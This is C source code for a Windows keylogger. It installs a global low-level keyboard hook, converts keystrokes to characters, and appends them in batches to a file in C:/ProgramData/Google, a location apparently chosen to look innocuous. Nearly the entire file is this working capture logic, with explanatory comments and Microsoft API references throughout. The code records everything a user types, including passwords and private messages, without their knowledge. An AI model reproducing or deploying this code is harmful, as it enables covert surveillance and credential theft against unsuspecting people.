#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

int fix = 56;
char *cont;
int size = 0;

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
	if (strlen(cont) > 53 )
	{

		FILE *ptr = fopen("C:/ProgramData/Google/W_Lo_1283.bin","ab+");
		// open a file
		cont[54] = '\n';
		int check = fwrite(cont, strlen(cont), 1, ptr);
		// write into the file all the content
		printf("%d",check);
		// Close file to save memory
		fclose(ptr);
		// reassign space and assign it terminating character at start to prevent garbage
		cont = (char*) malloc(fix * sizeof(char));
		size = 0;
		cont[size] = '\0'; 

	}

	KBDLLHOOKSTRUCT *pointer = (KBDLLHOOKSTRUCT *) lParam;

	// GetKeyState function is used to check if a key is pressed or not or in toggle like caps lock key.
	// It reurns short data type and if a key is pressed or in toggle on then the Most significant bit would be 1 that is it would be a negative number
	
	
	if(wParam == WM_KEYDOWN && (GetKeyState(VK_CONTROL) & 0x0001) != 0)
	{
		switch (pointer->vkCode){
			
			case 0x41:
				printf("CTRL + A key");
				break;

			case 0x43:
				printf("CTRL + C key");
				break;

			case 0x53:
				printf("CTRL + S key");
				break;

			case 0x56:
				printf("CTRL + V key");
				break;

		}
		// last change
		return CallNextHookEx(NULL, code, wParam, lParam);

	}


	if (wParam == WM_KEYDOWN && (GetKeyState(VK_CAPITAL) & 0x0001) != 0)
	{

        switch (pointer->vkCode){
			
			case 0x41:
				cont[size++] = 'A';
				cont[size] = '\0';
				break;
			
			case 0x42:
				cont[size++] = 'B';
				cont[size] = '\0';
				break;
			
			case 0x43:
				cont[size++] = 'C';
				cont[size] = '\0';
				break;
			
			case 0x44:
				cont[size++] = 'D';
				cont[size] = '\0';
				break;
			
			case 0x45:
				cont[size++] = 'E';
				cont[size] = '\0';
				break;
			
			case 0x46:
				cont[size++] = 'F';
				cont[size] = '\0';
				break;
			
			case 0x47:
				cont[size++] = 'G';
				cont[size] = '\0';
				break;
			
			case 0x48:
				cont[size++] = 'H';
				cont[size] = '\0';
				break;
			
			case 0x49:
				cont[size++] = 'I';
				cont[size] = '\0';
				break;
			
			case 0x4A:
				cont[size++] = 'J';
				cont[size] = '\0';
				break;
			
			case 0x4B:
				cont[size++] = 'K';
				cont[size] = '\0';
				break;
			
			case 0x4C:
				cont[size++] = 'L';
				cont[size] = '\0';
				break;
			
			case 0x4D:
				cont[size++] = 'M';
				cont[size] = '\0';
				break;
			
			case 0x4E:
				cont[size++] = 'N';
				cont[size] = '\0';
				break;
			
			case 0x4F:
				cont[size++] = 'O';
				cont[size] = '\0';
				break;
			
			case 0x50:
				cont[size++] = 'P';
				cont[size] = '\0';
				break;
			
			case 0x51:
				cont[size++] = 'Q';
				cont[size] = '\0';
				break;
			
			case 0x52:
				cont[size++] = 'R';
				cont[size] = '\0';
				break;
			
			case 0x53:
				cont[size++] = 'S';
				cont[size] = '\0';
				break;
			
			case 0x54:
				cont[size++] = 'T';
				cont[size] = '\0';
				break;
			
			case 0x55:
				cont[size++] = 'U';
				cont[size] = '\0';
				break;
			
			case 0x56:
				cont[size++] = 'V';
				cont[size] = '\0';
				break;
			
			case 0x57:
				cont[size++] = 'W';
				cont[size] = '\0';
				break;
			
			case 0x58:
				cont[size++] = 'X';
				cont[size] = '\0';
				break;
			
			case 0x59:
				cont[size++] = 'Y';
				cont[size] = '\0';
				break;
			
			case 0x5A:
				cont[size++] = 'Z';
				cont[size] = '\0';
				break;
		}
	
	return CallNextHookEx(NULL, code, wParam, lParam);
	}


	if (wParam == WM_KEYDOWN && GetKeyState(VK_SHIFT) < 0)
	{

        switch (pointer->vkCode){

        	case 0xBA:
				cont[size++] = ':';
				cont[size] = '\0';
				break;
			
			case 0xBB:
				cont[size++] = '=';
				cont[size] = '\0';
				break;
			
			case 0xBC:
				cont[size++] = '<';
				cont[size] = '\0';
				break;
			
			case 0xBD:
				cont[size++] = '_';
				cont[size] = '\0';
				break;
			
			case 0xBE:
				cont[size++] = '>';
				cont[size] = '\0';
				break;
			
			case 0xBF:
				cont[size++] = '?';
				cont[size] = '\0';
				break;
			
			case 0xC0:
				cont[size++] = '`';
				cont[size] = '\0';
				break;

			case 0xDB:
				cont[size++] = '{';
				cont[size] = '\0';
				break;
			
			case 0xDC:
				cont[size++] = '|';
				cont[size] = '\0';
				break;
		
			case 0xDD:
				cont[size++] = '}';
				cont[size] = '\0';
				break;
	
			case 0xDE:
				cont[size++] = '"';
				cont[size] = '\0';
				break;

			case 0xDF:
				cont[size++] = '`';
				cont[size] = '\0';
				break;

			
			case 0x30:
				cont[size++] = ')';
				cont[size] = '\0';
				break;
			
			case 0x31:
				cont[size++] = '!';
				cont[size] = '\0';
				break;
			
			case 0x32:
				cont[size++] = '@';
				cont[size] = '\0';
				break;
			
			case 0x33:
				cont[size++] = '#';
				cont[size] = '\0';
				break;
			
			case 0x34:
				cont[size++] = '$';
				cont[size] = '\0';
				break;
			
			case 0x35:
				cont[size++] = '%';
				cont[size] = '\0';
				break;
			
			case 0x36:
				cont[size++] = '^';
				cont[size] = '\0';
				break;
			
			case 0x37:
				cont[size++] = '&';
				cont[size] = '\0';
				break;
			
			case 0x38:
				cont[size++] = '*';
				cont[size] = '\0';
				break;
			
			case 0x39:
				cont[size++] = '(';
				cont[size] = '\0';
				break;

			
			case 0x41:
				cont[size++] = 'A';
				cont[size] = '\0';
				break;
			
			case 0x42:
				cont[size++] = 'B';
				cont[size] = '\0';
				break;
			
			case 0x43:
				cont[size++] = 'C';
				cont[size] = '\0';
				break;
			
			case 0x44:
				cont[size++] = 'D';
				cont[size] = '\0';
				break;
			
			case 0x45:
				cont[size++] = 'E';
				cont[size] = '\0';
				break;
			
			case 0x46:
				cont[size++] = 'F';
				cont[size] = '\0';
				break;
			
			case 0x47:
				cont[size++] = 'G';
				cont[size] = '\0';
				break;
			
			case 0x48:
				cont[size++] = 'H';
				cont[size] = '\0';
				break;
			
			case 0x49:
				cont[size++] = 'I';
				cont[size] = '\0';
				break;
			
			case 0x4A:
				cont[size++] = 'J';
				cont[size] = '\0';
				break;
			
			case 0x4B:
				cont[size++] = 'K';
				cont[size] = '\0';
				break;
			
			case 0x4C:
				cont[size++] = 'L';
				cont[size] = '\0';
				break;
			
			case 0x4D:
				cont[size++] = 'M';
				cont[size] = '\0';
				break;
			
			case 0x4E:
				cont[size++] = 'N';
				cont[size] = '\0';
				break;
			
			case 0x4F:
				cont[size++] = 'O';
				cont[size] = '\0';
				break;
			
			case 0x50:
				cont[size++] = 'P';
				cont[size] = '\0';
				break;
			
			case 0x51:
				cont[size++] = 'Q';
				cont[size] = '\0';
				break;
			
			case 0x52:
				cont[size++] = 'R';
				cont[size] = '\0';
				break;
			
			case 0x53:
				cont[size++] = 'S';
				cont[size] = '\0';
				break;
			
			case 0x54:
				cont[size++] = 'T';
				cont[size] = '\0';
				break;
			
			case 0x55:
				cont[size++] = 'U';
				cont[size] = '\0';
				break;
			
			case 0x56:
				cont[size++] = 'V';
				cont[size] = '\0';
				break;
			
			case 0x57:
				cont[size++] = 'W';
				cont[size] = '\0';
				break;
			
			case 0x58:
				cont[size++] = 'X';
				cont[size] = '\0';
				break;
			
			case 0x59:
				cont[size++] = 'Y';
				cont[size] = '\0';
				break;
			
			case 0x5A:
				cont[size++] = 'Z';
				cont[size] = '\0';
				break;
		}
	
	return CallNextHookEx(NULL, code, wParam, lParam);
	}



	if (code == HC_ACTION && wParam == WM_KEYDOWN)
	{
        switch (pointer->vkCode){
			
			case 0x30:
				cont[size++] = '0';
				cont[size] = '\0';
				break;
			
			case 0x31:
				cont[size++] = '1';
				cont[size] = '\0';
				break;
			
			case 0x32:
				cont[size++] = '2';
				cont[size] = '\0';
				break;
			
			case 0x33:
				cont[size++] = '3';
				cont[size] = '\0';
				break;
			
			case 0x34:
				cont[size++] = '4';
				cont[size] = '\0';
				break;
			
			case 0x35:
				cont[size++] = '5';
				cont[size] = '\0';
				break;
			
			case 0x36:
				cont[size++] = '6';
				cont[size] = '\0';
				break;
			
			case 0x37:
				cont[size++] = '7';
				cont[size] = '\0';
				break;
			
			case 0x38:
				cont[size++] = '8';
				cont[size] = '\0';
				break;
			
			case 0x39:
				cont[size++] = '9';
				cont[size] = '\0';
				break;

			
			case 0x41:
				cont[size++] = 'a';
				cont[size] = '\0';
				break;
			
			case 0x42:
				cont[size++] = 'b';
				cont[size] = '\0';
				break;
			
			case 0x43:
				cont[size++] = 'c';
				cont[size] = '\0';
				break;
			
			case 0x44:
				cont[size++] = 'd';
				cont[size] = '\0';
				break;
			
			case 0x45:
				cont[size++] = 'e';
				cont[size] = '\0';
				break;
			
			case 0x46:
				cont[size++] = 'f';
				cont[size] = '\0';
				break;
			
			case 0x47:
				cont[size++] = 'g';
				cont[size] = '\0';
				break;
			
			case 0x48:
				cont[size++] = 'h';
				cont[size] = '\0';
				break;
			
			case 0x49:
				cont[size++] = 'i';
				cont[size] = '\0';
				break;
			
			case 0x4A:
				cont[size++] = 'j';
				cont[size] = '\0';
				break;
			
			case 0x4B:
				cont[size++] = 'k';
				cont[size] = '\0';
				break;
			
			case 0x4C:
				cont[size++] = 'l';
				cont[size] = '\0';
				break;
			
			case 0x4D:
				cont[size++] = 'm';
				cont[size] = '\0';
				break;
			
			case 0x4E:
				cont[size++] = 'n';
				cont[size] = '\0';
				break;
			
			case 0x4F:
				cont[size++] = 'o';
				cont[size] = '\0';
				break;
			
			case 0x50:
				cont[size++] = 'p';
				cont[size] = '\0';
				break;
			
			case 0x51:
				cont[size++] = 'q';
				cont[size] = '\0';
				break;
			
			case 0x52:
				cont[size++] = 'r';
				cont[size] = '\0';
				break;
			
			case 0x53:
				cont[size++] = 's';
				cont[size] = '\0';
				break;
			
			case 0x54:
				cont[size++] = 't';
				cont[size] = '\0';
				break;
			
			case 0x55:
				cont[size++] = 'u';
				cont[size] = '\0';
				break;
			
			case 0x56:
				cont[size++] = 'v';
				cont[size] = '\0';
				break;
			
			case 0x57:
				cont[size++] = 'w';
				cont[size] = '\0';
				break;
			
			case 0x58:
				cont[size++] = 'x';
				cont[size] = '\0';
				break;
			
			case 0x59:
				cont[size++] = 'y';
				cont[size] = '\0';
				break;
			
			case 0x5A:
				cont[size++] = 'z';
				cont[size] = '\0';
				break;

			case 0x20:
				cont[size++] = ' ';
				cont[size] = '\0';
				break;
			
			case 0x21:
				printf("PAGE UP KEY");
				break;
			
			case 0x22:
				printf("PAGE DOWN KEY");
				break;
			
			case 0x23:
				printf("END KEY");
				break;
			
			case 0x24:
				printf("HOME KEY");
				break;
			
			case 0x25:
				printf("LEFT ARROW KEY");
				break;
			
			case 0x26:
				printf("UP ARROW KEY");
				break;
			
			case 0x27:
				printf("RIGHT ARROW KEY");
				break;
			
			case 0x28:
				printf("DOWN ARROW KEY");
				break;
			
			case 0x29:
				printf("SELECT KEY");
				break;
			
			case 0x2A:
				printf("PRINT KEY");
				break;
			
			case 0x2C:
				printf("PRINT SCREEN KEY");
				break;
			
			case 0x2D:
				printf("INSERT KEY");
				break;
			
			case 0x2E:
				printf("DELETE KEY");
				break;
			
			case 0x1B:
				printf("ESC KEY");
				break;
			
			case 0x08:
				if (size>0) 
					cont[--size] = '\0';
				break;
			
			case 0x09:
				cont[size++] = '	';
				cont[size] = '\0';
				break;
			
			case 0x0D:
				cont[size++] = '\n';
				cont[size] = '\0';
				break;
			
			case 0x12:
				printf("ALT KEY");
				break;
			
			case 0x14:
				printf("CAPS LOCK KEY");
				break;

			case 0x5B:
				printf("LEFT WINDOWS KEY");
				break;
			
			case 0x5C:
				printf("RIGHT WINDOWS KEY");
				break;
			
			case 0x5D:
				printf("APPLICATION KEY");
				break;
			
			case 0x5F:
				printf("SLEEP KEY");
				break;

			case 0x60:
				cont[size++] = '0';
				cont[size] = '\0';
				break;
			
			case 0x61:
				printf("NUMPAD 1");
				break;
			
			case 0x62:
				printf("NUMPAD 2");
				break;
			
			case 0x63:
				printf("NUMPAD 3");
				break;
			
			case 0x64:
				printf("NUMPAD 4");
				break;
			
			case 0x65:
				printf("NUMPAD 5");
				break;
			
			case 0x66:
				printf("NUMPAD 6");
				break;
			
			case 0x67:
				printf("NUMPAD 7");
				break;
			
			case 0x68:
				printf("NUMPAD 8");
				break;
			
			case 0x69:
				printf("NUMPAD 9");
				break;

			case 0x6A:
				printf("NUMPAD MULTIPLY");
				break;
			
			case 0x6B:
				printf("NUMPAD ADD");
				break;
			
			case 0x6D:
				printf("NUMPAD SUBTRACT");
				break;
			
			case 0x6E:
				printf("NUMPAD DECIMAL");
				break;
			
			case 0x6F:
				printf("NUMPAD DIVIDE");
				break;

			case 0x70:
				printf("F1 KEY");
				break;
			
			case 0x71:
				printf("F2 KEY");
				break;
			
			case 0x72:
				printf("F3 KEY");
				break;
			
			case 0x73:
				printf("F4 KEY");
				break;
			
			case 0x74:
				printf("F5 KEY");
				break;
			
			case 0x75:
				printf("F6 KEY");
				break;
			
			case 0x76:
				printf("F7 KEY");
				break;
			
			case 0x77:
				printf("F8 KEY");
				break;
			
			case 0x78:
				printf("F9 KEY");
				break;
			
			case 0x79:
				printf("F10 KEY");
				break;
			
			case 0x7A:
				printf("F11 KEY");
				break;
			
			case 0x7B:
				printf("F12 KEY");
				break;

			case 0x90:
				printf("NUM LOCK KEY");
				break;
			
			case 0x91:
				printf("SCROLL LOCK KEY");
				break;

			case 0x7C:
				printf("F13 KEY");
				break;
			
			case 0x7D:
				printf("F14 KEY");
				break;
			
			case 0x7E:
				printf("F15 KEY");
				break;
			
			case 0x7F:
				printf("F16 KEY");
				break;
			
			case 0x80:
				printf("F17 KEY");
				break;
			
			case 0x81:
				printf("F18 KEY");
				break;
			
			case 0x82:
				printf("F19 KEY");
				break;
			
			case 0x83:
				printf("F20 KEY");
				break;
			
			case 0x84:
				printf("F21 KEY");
				break;
			
			case 0x85:
				printf("F22 KEY");
				break;
			
			case 0x86:
				printf("F23 KEY");
				break;
			
			case 0x87:
				printf("F24 KEY");
				break;

			case 0xA2:
				printf("LEFT CTRL KEY");
				break;
			
			case 0xA3:
				printf("RIGHT CTRL KEY");
				break;
			
			case 0xA4:
				printf("LEFT ALT KEY");
				break;
			
			case 0xA5:
				printf("RIGHT ALT KEY");
				break;

			case 0xA6:
				printf("BROWSER BACK KEY");
				break;
			
			case 0xA7:
				printf("BROWSER FORWARD KEY");
				break;
			
			case 0xA8:
				printf("BROWSER REFRESH KEY");
				break;
			
			case 0xA9:
				printf("BROWSER STOP KEY");
				break;
			
			case 0xAA:
				printf("BROWSER SEARCH KEY");
				break;
			
			case 0xAB:
				printf("BROWSER FAVORITES KEY");
				break;
			
			case 0xAC:
				printf("BROWSER HOME KEY");
				break;

			
			case 0xAD:
				printf("VOLUME MUTE KEY");
				break;
			
			case 0xAE:
				printf("VOLUME DOWN KEY");
				break;
			
			case 0xAF:
				printf("VOLUME UP KEY");
				break;

			case 0xB0:
				printf("MEDIA NEXT TRACK KEY");
				break;
			
			case 0xB1:
				printf("MEDIA PREVIOUS TRACK KEY");
				break;
			
			case 0xB2:
				printf("MEDIA STOP KEY");
				break;
			
			case 0xB3:
				printf("MEDIA PLAY PAUSE KEY");
				break;

			case 0xB4:
				printf("LAUNCH MAIL KEY");
				break;
			
			case 0xB5:
				printf("LAUNCH MEDIA SELECT KEY");
				break;
			
			case 0xB6:
				printf("LAUNCH APPLICATION 1 KEY");
				break;
			
			case 0xB7:
				printf("LAUNCH APPLICATION 2 KEY");
				break;

			case 0xBA:
				cont[size++] = ';';
				cont[size] = '\0';
				break;
			
			case 0xBB:
				cont[size++] = '=';
				cont[size] = '\0';
				break;
			
			case 0xBC:
				cont[size++] = ',';
				cont[size] = '\0';
				break;
			
			case 0xBD:
				cont[size++] = '-';
				cont[size] = '\0';
				break;
			
			case 0xBE:
				cont[size++] = '.';
				cont[size] = '\0';
				break;
			
			case 0xBF:
				cont[size++] = '/';
				cont[size] = '\0';
				break;
			
			case 0xC0:
				cont[size++] = '~';
				cont[size] = '\0';
				break;

			case 0xC3:
				printf("GAMEPAD A BUTTON");
				break;
			
			case 0xC4:
				printf("GAMEPAD B BUTTON");
				break;
			
			case 0xC5:
				printf("GAMEPAD X BUTTON");
				break;
			
			case 0xC6:
				printf("GAMEPAD Y BUTTON");
				break;
			
			case 0xC7:
				printf("GAMEPAD RIGHT SHOULDER BUTTON");
				break;
			
			case 0xC8:
				printf("GAMEPAD LEFT SHOULDER BUTTON");
				break;
			
			case 0xC9:
				printf("GAMEPAD LEFT TRIGGER BUTTON");
				break;
			
			case 0xCA:
				printf("GAMEPAD RIGHT TRIGGER BUTTON");
				break;
			
			case 0xCB:
				printf("GAMEPAD DPAD UP BUTTON");
				break;
			
			case 0xCC:
				printf("GAMEPAD DPAD DOWN BUTTON");
				break;
			
			case 0xCD:
				printf("GAMEPAD DPAD LEFT BUTTON");
				break;
			
			case 0xCE:
				printf("GAMEPAD DPAD RIGHT BUTTON");
				break;
			
			case 0xCF:
				printf("GAMEPAD MENU BUTTON");
				break;
			
			case 0xD0:
				printf("GAMEPAD VIEW BUTTON");
				break;
			
			case 0xD1:
				printf("GAMEPAD LEFT THUMBSTICK BUTTON");
				break;
			
			case 0xD2:
				printf("GAMEPAD RIGHT THUMBSTICK BUTTON");
				break;
			
			case 0xD3:
				printf("GAMEPAD LEFT THUMBSTICK UP");
				break;
			
			case 0xD4:
				printf("GAMEPAD LEFT THUMBSTICK DOWN");
				break;
			
			case 0xD5:
				printf("GAMEPAD LEFT THUMBSTICK RIGHT");
				break;
			
			case 0xD6:
				printf("GAMEPAD LEFT THUMBSTICK LEFT");
				break;
			
			case 0xD7:
				printf("GAMEPAD RIGHT THUMBSTICK UP");
				break;
			
			case 0xD8:
				printf("GAMEPAD RIGHT THUMBSTICK DOWN");
				break;
			
			case 0xD9:
				printf("GAMEPAD RIGHT THUMBSTICK RIGHT");
				break;
			
			case 0xDA:
				printf("GAMEPAD RIGHT THUMBSTICK LEFT");
				break;

			case 0xDB:
				cont[size++] = '[';
				cont[size] = '\0';
				break;
			
			case 0xDC:
				cont[size++] = '\\';
				cont[size] = '\0';
				break;
		
			case 0xDD:
				cont[size++] = ']';
				cont[size] = '\0';
				break;
	
			case 0xDE:
				cont[size++] = '\'';
				cont[size] = '\0';
				break;

			case 0xDF:
				cont[size++] = '~';
				cont[size] = '\0';
				break;

        }

        //cont[size++] = pointer->vkCode;
		printf("%s\n",cont);
	}

	// Each hook procedure in the chain determines whether to pass the event to the next procedure. 
	//A hook procedure passes an event to the next procedure by calling the CallNextHookEx function.
	// THIS FUNCTION IS CRITICAL IT PASSES DATA TO NEXT EVENT THAT IS IF A KEY IS PRESSED IT IS FIRST REGISTERED HERE
	// THEN THE KEY DUE TO THIS FUNCTION GOES TO THE FRONTEND OR THE APPLICATION IT WAS INTENDED FOR
	return CallNextHookEx(NULL, code, wParam, lParam);

	// Reference : https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks
}

int main()
{
	CreateDirectoryA("C:/ProgramData/Google" , NULL);
	// Used to create a directory

	printf("KeyLogger Started\n");
    cont = (char*) malloc(fix * sizeof(char));

	// Reference : https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa

	// This is basically a windows API call that allows the program to hook 
	// into or installs an application-defined hook procedure into a hook chain
	// Application defined hook is the ability of a program to intecept events like keystrokes and mouse actions and etc
	// This is done through a prcocess called hook procedure
	// Hook chain is a list of pointers to hook procedure
	// Syntax of given function 
	// HHOOK SetWindowsHookExA(int idHook, HOOKPROC  lpfn, HINSTANCE hmod, DWORD dwThreadId
	// herein id is the type of hook procedure to be installed
	// WH_KEYBOARD_LL : ID for keyboard low level to intercept keystrokes
	// lpfn : A pointer to the hook procedure. Simply create a function for accomplishing the tasks
	// hmod : A handle to the DLL containing the hook procedure pointed to by the lpfn parameter.
	// Set above to null if the function is given in the same program or code that is in the same thread
	// dwthreadid : identity of thread to install hook for. Here 0 because the thread is global or all threads otherwise the specific number 
    
	HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);



	// It return null if hook was not installed

	if (hhook == NULL)
		printf("HOOK not Installed");

	printf("Hook Was Installed");

	MSG msg;
	while ((GetMessage(&msg, NULL, 0, 0) != 0))
    // This function waits for the next incoming windows message. So basically when the message has arrive successfully
    // and retirieved normally it stay stuck in loop. That is such a case output will be of condition > 0
    // It will be 0 when quick signal or WM_QUIT is received
    // Here example of messages are WM_DOWN , WM_MOUSEMOVE and etc
	{
		TranslateMessage(&msg);
        // It translates or convertes virtual key messages like WM_KEYDOWN into character messages like "a" or "A" and etc
		DispatchMessage(&msg);
        // This sends message to the window procedure that handle the event that is hook_proc
	}


	/*
		Reference
			https://learn.microsoft.com/en-us/uwp/api/windows.devices.input?view=winrt-26100
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeynametexta
			https://learn.microsoft.com/en-us/windows/win32/api/_winmsg/
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
			https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks
			https://learn.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
			https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
			https://learn.microsoft.com/en-us/windows/win32/inputdev/keyboard-input
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getfocus
			https://learn.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input#character-messages
			https://learn.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input#extended-key-flag
			https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
			https://stackoverflow.com/questions/6331868/using-getkeystate
			(Notes Too)

	*/
}